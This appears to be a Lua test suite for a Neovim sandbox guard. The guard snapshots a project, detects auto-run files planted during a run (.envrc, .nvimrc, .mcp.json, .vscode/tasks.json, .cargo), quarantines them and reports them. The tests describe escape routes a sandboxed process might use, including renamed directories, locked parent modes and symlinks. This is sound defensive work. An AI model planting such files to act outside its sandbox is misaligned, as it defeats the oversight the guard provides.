    local lines, loud = guard.report({
      review = { { path = "/r", change = "created" } },
      modified = { "/m" },
      tampered = { { from = "/f", to = "/t", names = {} } },
    })
    H.eq(3, #lines)
    H.eq(nil, loud[1])
    H.eq(true, loud[2])
    H.eq(true, loud[3])
    H.match(lines[1], "/r", true)
    H.match(lines[2], "/m", true)
    H.match(lines[3], "/f -> /t", true)
    H.eq({}, (guard.report({ review = {}, modified = {}, tampered = {} })))
  end)
end)

describe("the quarantine, step by step", function()
  local function modes(p)
    return bit.band(uv.fs_lstat(p).mode, tonumber("777", 8))
  end

  it("a removal that works is tried once; one that needs the parent opened is tried twice", function()
    local project = H.tmpdir()
    write(project .. "/a/.envrc", "x\n")
    write(project .. "/b/.envrc", "x\n")
    uv.fs_chmod(project .. "/b", tonumber("555", 8))
    local calls = {}
    local old = guard._delete
    guard._delete = function(p)
      calls[#calls + 1] = p
      return old(p)
    end
    local q = guard.quarantine(project, { project .. "/a/.envrc", project .. "/b/.envrc" })
    guard._delete = old
    H.eq({ project .. "/a/.envrc", project .. "/b/.envrc", project .. "/b/.envrc" }, calls)
    H.eq(true, q.moved[1].ok)
    H.eq(true, q.moved[2].ok)
    H.eq(tonumber("555", 8), modes(project .. "/b"))
    H.eq(tonumber("755", 8), modes(project .. "/a"))
    uv.fs_chmod(project .. "/b", tonumber("755", 8))
  end)

  it("every parent up to the project root is opened and put back, the root's own mode too", function()
    local project = H.tmpdir()
    write(project .. "/a/b/.envrc", "x\n")
    write(project .. "/.envrc", "x\n")
    uv.fs_chmod(project .. "/a/b", tonumber("555", 8))
    uv.fs_chmod(project, tonumber("555", 8))
    local q = guard.quarantine(project, { project .. "/a/b/.envrc", project .. "/.envrc" })
    H.eq(true, q.moved[1].ok)
    H.eq(true, q.moved[2].ok, "a name directly in a 555 project root")
    H.eq(tonumber("555", 8), modes(project))
    H.eq(tonumber("555", 8), modes(project .. "/a/b"))
    H.eq(nil, uv.fs_lstat(project .. "/.envrc"))
    uv.fs_chmod(project, tonumber("755", 8))
    uv.fs_chmod(project .. "/a/b", tonumber("755", 8))
  end)

  it("a planted directory with a 000 sub-directory deeper than the copy goes is still removed", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/p", "p")
    local deep = project .. "/p/.cargo/1/2/3/4/5/6/7/8/9"
    write(deep .. "/file", "x\n")
    uv.fs_chmod(project .. "/p/.cargo/1/2", tonumber("555", 8))
    uv.fs_chmod(deep, tonumber("000", 8))
    local q = guard.quarantine(project, { project .. "/p/.cargo" })
    H.eq(true, q.moved[1].ok)
    H.eq(nil, uv.fs_lstat(project .. "/p/.cargo"))
  end)

  it("the copy lists directories down to the 8th level: a file in the 7th is copied, one in the 8th is not", function()
    local project = H.tmpdir()
    write(project .. "/.cargo/1/2/3/4/5/6/7/f7", "x\n")
    write(project .. "/.cargo/1/2/3/4/5/6/7/8/f8", "x\n")
    local q = guard.quarantine(project, { project .. "/.cargo" })
    H.ok(uv.fs_stat(q.dir .. "/.cargo/1/2/3/4/5/6/7/f7"), "level 7 is copied")
    H.ok(uv.fs_stat(q.dir .. "/.cargo/1/2/3/4/5/6/7/8"), "the 8th directory itself is made")
    H.eq(nil, uv.fs_stat(q.dir .. "/.cargo/1/2/3/4/5/6/7/8/f8"), "its content is not")
  end)

  it("the copy of a path outside the project is filed under its base name", function()
    local project = H.tmpdir()
    local other = H.tmpdir()
    write(other .. "/.envrc", "x\n")
    local q = guard.quarantine(project, { other .. "/.envrc" })
    H.ok(uv.fs_stat(q.dir .. "/.envrc"))
    uv.fs_unlink(other .. "/.envrc")
  end)

  it("the copy is private: 0700 directory, 0600 files", function()
    local project = H.tmpdir()
    write(project .. "/.cargo/config.toml", "x\n")
    local q = guard.quarantine(project, { project .. "/.cargo" })
    H.eq(tonumber("700", 8), modes(q.dir))
    H.eq(tonumber("600", 8), modes(q.dir .. "/.cargo/config.toml"))
  end)
end)

describe("the quarantine removes without following links", function()
  it("a symlink inside a planted directory is removed, its target is not touched", function()
    local project = H.tmpdir()
    local keep = H.tmpdir() .. "/keep"
    write(keep, "precious\n")
    vim.fn.mkdir(project .. "/p/.cargo", "p")
    uv.fs_symlink(keep, project .. "/p/.cargo/link")
    uv.fs_symlink(vim.fs.dirname(keep), project .. "/p/.cargo/dirlink")
    local q = guard.quarantine(project, { project .. "/p/.cargo" })
    H.eq(true, q.moved[1].ok)
    H.eq(nil, uv.fs_lstat(project .. "/p/.cargo"))
    H.eq("precious\n", io.open(keep):read("a"))
    H.eq(keep, uv.fs_readlink(q.dir .. "/p/.cargo/link"))
  end)

  it("an empty planted file is copied (empty) and removed", function()
    local project = H.tmpdir()
    write(project .. "/p/.envrc", "")
    local q = guard.quarantine(project, { project .. "/p/.envrc" })
    H.eq(true, q.moved[1].ok)
    H.eq(0, uv.fs_stat(q.dir .. "/p/.envrc").size)
  end)
end)

describe("survivors of the mutation run on the new guard code", function()
  local function with(field, value, fn)
    local old = guard[field]
    guard[field] = value
    local ok, err = pcall(fn)
    guard[field] = old
    assert(ok, err)
  end

  it("a file whose text was dropped for size (hash kept) also has an unknown line count", function()
    with("REVIEW_KEEP_BYTES", 0, function()
      local project = H.tmpdir()
      write(project .. "/s/.cargo/a.toml", "x\n")
      local before = guard.snapshot(project)
      os.rename(project .. "/s", project .. "/t")
      write(project .. "/t/.cargo/a.toml", "y\nz\n")
      local res = guard.compare(before, guard.snapshot(project))
      H.eq(1, #res.tampered)
      H.eq(nil, res.tampered[1].plus)
      H.eq(nil, res.tampered[1].minus)
    end)
  end)

  it("an added or a removed file whose text was dropped (hash kept) has an unknown count, not zero", function()
    with("REVIEW_KEEP_BYTES", 0, function()
      local project = H.tmpdir()
      write(project .. "/s/.cargo/a.toml", "x\n")
      local before = guard.snapshot(project)
      os.rename(project .. "/s", project .. "/t")
      write(project .. "/t/.cargo/new.toml", "1\n2\n")
      local res = guard.compare(before, guard.snapshot(project))
      H.eq(nil, res.tampered[1].plus, "added")
      H.eq(nil, res.tampered[1].minus)
      local project2 = H.tmpdir()
      write(project2 .. "/s/.cargo/a.toml", "x\n")
      write(project2 .. "/s/.cargo/b.toml", "x\n")
      local before2 = guard.snapshot(project2)
      os.rename(project2 .. "/s", project2 .. "/t")
      os.remove(project2 .. "/t/.cargo/b.toml")
      local res2 = guard.compare(before2, guard.snapshot(project2))
      H.eq(nil, res2.tampered[1].plus, "removed")
      H.eq(nil, res2.tampered[1].minus)
    end)
  end)

  it("a protected name that is gone is 'removed'; one that moved is not; the list is sorted", function()
    local project = H.tmpdir()
    write(project .. "/z/.envrc", "1\n")
    write(project .. "/a/.envrc", "1\n")
    write(project .. "/m/.envrc", "1\n")
    local before = guard.snapshot(project)
    os.remove(project .. "/z/.envrc")
    os.remove(project .. "/a/.envrc")
    os.rename(project .. "/m", project .. "/n")
    local res = guard.compare(before, guard.snapshot(project))
    H.eq({ project .. "/a/.envrc", project .. "/z/.envrc" }, res.removed)
    H.eq(1, #res.moved)
    H.eq({}, res.planted)
  end)

  it("a protected name in the new snapshot only is planted even when the old one has no inode table", function()
    local project = H.tmpdir()
    write(project .. "/a/.envrc", "1\n")
    local now = guard.snapshot(project)
    local old = { protected = {}, review = {} } -- no ino table: nothing can be 'moved'
    local res = guard.compare(old, now)
    H.eq({ project .. "/a/.envrc" }, res.planted)
    H.eq({}, res.moved)
    -- an old snapshot WITH an inode table that lacks the entry
    local old2 = { protected = {}, ino = {}, review = {} }
    H.eq({}, guard.compare(old2, now).moved)
    -- and a gone path without an inode entry cannot be matched either
    local old3 = { protected = { [project .. "/b/.envrc"] = "x" }, ino = {}, review = {} }
    local res3 = guard.compare(old3, now)
    H.eq({}, res3.moved)
    H.eq({ project .. "/b/.envrc" }, res3.removed)
  end)

  it("the review records: a file of exactly REVIEW_MAX_BYTES has a hash and text, one byte more has none", function()
    with("REVIEW_MAX_BYTES", 50, function()
      local project = H.tmpdir()
      write(project .. "/Makefile", ("a"):rep(50))
      local snap = guard.snapshot(project)
      H.ok(snap.review[project .. "/Makefile"].sha)
      write(project .. "/Makefile", ("a"):rep(51))
      snap = guard.snapshot(project)
      H.eq(nil, snap.review[project .. "/Makefile"].sha)
      H.eq(nil, snap.review[project .. "/Makefile"].text)
    end)
  end)

  it("a directory named like a review file is not a review record", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/Makefile", "p")
    H.eq(nil, guard.snapshot(project).review[project .. "/Makefile"])
  end)

  it("the refusal text lists 5 planted names and says '...' for more, not for exactly 5", function()
    local five, six = {}, {}
    for i = 1, 6 do
      six[i] = "/p/n" .. i
      if i <= 5 then
        five[i] = six[i]
      end
    end
    local t5 = guard.dirty_reason({ planted = five, quarantine = "/q" })
    H.match(t5, "created 5 files", true)
    H.match(t5, "/p/n5)", true)
    H.no_match(t5, "...", true, t5)
    local t6 = guard.dirty_reason({ planted = six, quarantine = "/q" })
    H.match(t6, "created 6 files", true)
    H.match(t6, "/p/n5, ...)", true)
    H.no_match(t6, "/p/n6", true)
    H.match(guard.dirty_reason({ planted = { "/p/a" }, quarantine = "/q" }), "created 1 file that run", true)
  end)

  it("the incomplete-check sentence: alone, and after the planted sentence with one space", function()
    local alone = guard.dirty_reason({ planted = {}, incomplete = { "the project walk stopped (x)" } })
    H.match(
      alone,
      "The end-of-run check of the project tree could not be completed (the project walk stopped (x)), so more may have been created.",
      true
    )
    H.eq("T", alone:sub(1, 1))
    local both = guard.dirty_reason({ planted = { "/p/a" }, quarantine = "/q", incomplete = { "b1", "b2" } })
    H.match(both, "a copy is in /q. The end-of-run check", true)
    H.match(both, "(b1; b2)", true)
    H.no_match(guard.dirty_reason({ planted = { "/p/a" }, quarantine = "/q", incomplete = {} }), "end-of-run", true)
    H.no_match(guard.dirty_reason({ planted = { "/p/a" }, quarantine = "/q" }), "end-of-run", true)
  end)

  it("report accepts a result without 'tampered' and 'details' (an older caller)", function()
    local lines = guard.report({ review = {}, modified = { "/p/x" } })
    H.eq(1, #lines)
    H.eq(0, #guard.report({ review = {}, modified = {} }))
  end)

  it("a count needs both numbers: plus alone prints none", function()
    local lines = guard.report({ review = { { path = "/p/x", change = "changed", plus = 3 } }, modified = {} })
    H.no_match(lines[1], "+3", true, lines[1])
    lines = guard.report({
      review = {},
      modified = { "/p/y" },
      details = { ["/p/y"] = { plus = 3 } },
    })
    H.no_match(lines[1], "+3", true, lines[1])
    lines =
      guard.report({ review = {}, modified = {}, tampered = { { from = "/a", to = "/b", plus = 3, names = {} } } })
    H.no_match(lines[1], "+3", true, lines[1])
    lines =
      guard.report({ review = {}, modified = {}, tampered = { { from = "/a", to = "/b", minus = 3, names = {} } } })
    H.no_match(lines[1], "-3", true, lines[1])
  end)

  it("exactly 8 tampered names are all listed without a total; 9 get the total", function()
    local t = {}
    for i = 1, 8 do
      t[i] = { from = "/a" .. i, to = "/b" .. i, names = {} }
    end
    local lines = guard.report({ review = {}, modified = {}, tampered = t })
    H.match(lines[1], "/b8", true)
    H.no_match(lines[1], "in all", true)
    t[9] = { from = "/a9", to = "/b9", names = {} }
    lines = guard.report({ review = {}, modified = {}, tampered = t })
    H.match(lines[1], "9 in all", true)
    H.match(lines[1], "/b8", true)
    H.no_match(lines[1], "/b9", true)
  end)

  it("the quarantine says it was cut when ANY of the paths was cut", function()
    local project = H.tmpdir()
    write(project .. "/a/.envrc", ("x"):rep(guard.QUARANTINE_FILE_MAX + 1))
    write(project .. "/b/.envrc", "small\n")
    H.eq(true, guard.quarantine(project, { project .. "/a/.envrc", project .. "/b/.envrc" }).cut)
    write(project .. "/c/.envrc", ("x"):rep(guard.QUARANTINE_FILE_MAX + 1))
    write(project .. "/d/.envrc", "small\n")
    H.eq(true, guard.quarantine(project, { project .. "/d/.envrc", project .. "/c/.envrc" }).cut)
    write(project .. "/e/.envrc", "small\n")
    H.eq(false, guard.quarantine(project, { project .. "/e/.envrc" }).cut)
  end)

  it("a path that does not exist any more is a success with an empty copy", function()
    local project = H.tmpdir()
    local q = guard.quarantine(project, { project .. "/gone/.envrc" })
    H.eq(true, q.moved[1].ok)
    H.eq(nil, uv.fs_stat(q.dir .. "/gone/.envrc"))
  end)

  it("a directory that cannot be removed leaves ok = false and the rest of the paths are still done", function()
    local project = H.tmpdir()
    write(project .. "/a/.envrc", "1\n")
    write(project .. "/b/.envrc", "2\n")
    local old = guard._delete
    guard._delete = function(p)
      if p:find("/a/", 1, true) then
        return -1
      end
      return old(p)
    end
    local q = guard.quarantine(project, { project .. "/a/.envrc", project .. "/b/.envrc" })
    guard._delete = old
    H.eq(false, q.moved[1].ok)
    H.eq(true, q.moved[2].ok)
    H.eq(nil, uv.fs_lstat(project .. "/b/.envrc"))
    os.remove(project .. "/a/.envrc")
  end)
end)

describe("the notices of the end-of-run sweep", function()
  local function release_with_notes(h)
    local notes = {}
    local old = vim.notify
    vim.notify = function(m, l)
      notes[#notes + 1] = { m, l }
    end
    local ok, err = pcall(h.release)
    vim.notify = old
    assert(ok, err)
    return notes
  end

  it("nothing changed: no notice at all and no mark", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/x", "p")
    local h = launch(project)
    H.eq({}, release_with_notes(h))
    H.eq(nil, sb.dirty(project))
    H.eq({}, vim.fn.glob(store.dir() .. "/quarantine/*", false, true), "no quarantine directory is made for nothing")
  end)

  it("one planted name: singular words; the notice is an ERROR", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/x", "p")
    local h = launch(project)
    write(project .. "/x/.envrc", "evil\n")
    local notes = release_with_notes(h)
    H.eq(1, #notes)
    H.eq(vim.log.levels.ERROR, notes[1][2])
    H.match(notes[1][1], "created 1 file that acts outside the sandbox", true)
    H.match(notes[1][1], "It was moved to", true)
    H.match(notes[1][1], "outside the sandbox: " .. project .. "/x/.envrc.", true, "the first name is shown")
    H.no_match(notes[1][1], "COULD NOT REMOVE", true)
    sb.clear_dirty(project)
  end)

  it("two planted names: plural words, no '...'; six: five are shown and '...'", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/x", "p")
    local h = launch(project)
    write(project .. "/x/.envrc", "1\n")
    write(project .. "/x/.nvimrc", "1\n")
    local notes = release_with_notes(h)
    H.match(notes[1][1], "created 2 files that act outside the sandbox", true)
    H.match(notes[1][1], "They were moved to", true)
    H.no_match(notes[1][1], "...", true, notes[1][1])
    sb.clear_dirty(project)
    local project2 = H.tmpdir()
    vim.fn.mkdir(project2 .. "/x", "p")
    local h2 = launch(project2)
    for _, n in ipairs({ ".envrc", ".nvimrc", ".exrc", ".mcp.json", ".nvim.lua", ".lvimrc" }) do
      write(project2 .. "/x/" .. n, "1\n")
    end
    notes = release_with_notes(h2)
    H.match(notes[1][1], "created 6 files", true)
    H.match(notes[1][1], ".nvim.lua, ...", true) -- (sorted: the sixth is .nvimrc)
    H.no_match(notes[1][1], ".nvimrc", true)
    sb.clear_dirty(project2)
  end)

  it("exactly five planted names have no '...'", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/x", "p")
    local h = launch(project)
    for _, n in ipairs({ ".envrc", ".nvimrc", ".exrc", ".mcp.json", ".nvim.lua" }) do
      write(project .. "/x/" .. n, "1\n")
    end
    local notes = release_with_notes(h)
    H.match(notes[1][1], "created 5 files", true)
    H.no_match(notes[1][1], "...", true, notes[1][1])
    sb.clear_dirty(project)
  end)

  it("a name that could not be removed is named in the notice", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/x", "p")
    local h = launch(project)
    write(project .. "/x/.envrc", "1\n")
    local old = guard._delete
    guard._delete = function()
      return -1
    end
    local notes = release_with_notes(h)
    guard._delete = old
    H.match(notes[1][1], "COULD NOT REMOVE: " .. project .. "/x/.envrc", true)
    os.remove(project .. "/x/.envrc")
    sb.clear_dirty(project)
  end)

  it("an empty directory left behind is removed silently; a directory with a file in it is quarantined", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/x", "p")
    local h = launch(project)
    vim.fn.mkdir(project .. "/x/.cargo", "p") -- the empty placeholder of a renamed directory
    vim.fn.mkdir(project .. "/x/.vscode", "p")
    write(project .. "/x/.vscode/tasks.json", "{}\n")
    local notes = release_with_notes(h)
    H.eq(nil, uv.fs_lstat(project .. "/x/.cargo"))
    H.eq(nil, uv.fs_lstat(project .. "/x/.vscode"))
    H.eq({ project .. "/x/.vscode" }, sb.dirty(project).planted)
    H.match(notes[1][1], "created 1 file", true)
    sb.clear_dirty(project)
  end)

  it("a tampered move alone marks the project; the planted list stays empty", function()
    local project = H.tmpdir()
    write(project .. "/s/.cargo/config.toml", "a\n")
    local h = launch(project)
    os.rename(project .. "/s", project .. "/t")
    write(project .. "/t/.cargo/config.toml", "b\n")
    release_with_notes(h)
    local rec = sb.dirty(project)
    H.ok(rec)
    H.eq({}, rec.planted)
    H.eq(1, #rec.tampered)
    H.eq(project .. "/t/.cargo", rec.tampered[1].to)
    H.match(guard.dirty_reason(rec), "A protected name was moved", true)
    sb.clear_dirty(project)
  end)

  it("a changed existing name alone does not mark the project (a notice only)", function()
    local project = H.tmpdir()
    write(project .. "/d/e/.envrc", "a\n")
    local h = launch(project)
    write(project .. "/d/e/.envrc", "b\n")
    local notes = release_with_notes(h)
    H.eq(nil, sb.dirty(project))
    H.eq(1, #notes)
    H.eq(vim.log.levels.ERROR, notes[1][2])
  end)

  it("a walk that stopped at launch is INFO 'already partial', the project is not marked", function()
    local project = H.tmpdir()
    for i = 1, 6 do
      vim.fn.mkdir(project .. "/d" .. i, "p")
    end
    local old = guard.MAX_DIRS
    guard.MAX_DIRS = 3
    local ok, err = pcall(function()
      local h = launch(project)
      local notes = release_with_notes(h)
      H.eq(1, #notes)
      H.eq(vim.log.levels.INFO, notes[1][2])
      H.match(notes[1][1], "already partial at launch", true)
      H.eq(nil, sb.dirty(project))
    end)
    guard.MAX_DIRS = old
    assert(ok, err)
  end)

  it("a walk that stopped only at the end marks the project and says why", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/d1", "p")
    local old = guard.MAX_DIRS
    guard.MAX_DIRS = 4
    local ok, err = pcall(function()
      local h = launch(project)
      for i = 2, 9 do
        vim.fn.mkdir(project .. "/d" .. i, "p")
      end
      local notes = release_with_notes(h)
      H.eq(1, #notes)
      H.eq(vim.log.levels.ERROR, notes[1][2])
      H.match(notes[1][1], "could NOT be completed", true)
      H.ok(sb.dirty(project))
      sb.clear_dirty(project)
    end)
    guard.MAX_DIRS = old
    assert(ok, err)
  end)
end)
